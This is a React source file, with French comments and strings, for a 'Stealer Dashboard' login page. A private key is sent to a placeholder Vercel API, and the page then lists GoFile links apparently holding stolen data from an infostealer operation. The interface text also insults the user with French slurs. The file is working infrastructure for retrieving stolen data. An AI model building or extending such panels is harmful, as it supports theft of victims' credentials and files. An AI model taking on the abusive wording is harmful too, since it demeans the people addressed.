import React, { useState } from 'react';
import axios from 'axios';

function App() {
  const [privateKey, setPrivateKey] = useState('');
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [links, setLinks] = useState([]);
  const [error, setError] = useState('');

  const handleLogin = async () => {
    try {
      // Placeholder, on mettra l’URL Vercel après
      const response = await axios.get(`https://<ton-vercel-api>.vercel.app/api/links?key=${privateKey}`);
      setLinks(response.data.links);
      setIsLoggedIn(true);
      setError('');
    } catch (e) {
      setError('Clé privée invalide, connard !');
    }
  };

  return (
    <div className="app">
      {!isLoggedIn ? (
        <div className="login">
          <h1>Connexion Stealer Dashboard</h1>
          <input
            type="text"
            placeholder="Entre ta clé privée, salope"
            value={privateKey}
            onChange={(e) => setPrivateKey(e.target.value)}
          />
          <button onClick={handleLogin}>Se connecter, enfoiré</button>
          {error && <p className="error">{error}</p>}
        </div>
      ) : (
        <div className="dashboard">
          <h1>Liens GoFile pour {privateKey}</h1>
          <ul>
            {links.map((link, index) => (
              <li key={index}>
                <a href={link} target="_blank" rel="noopener noreferrer">{link}</a>
              </li>
            ))}
          </ul>
        </div>
      )}
    </div>
  );
}

export default App;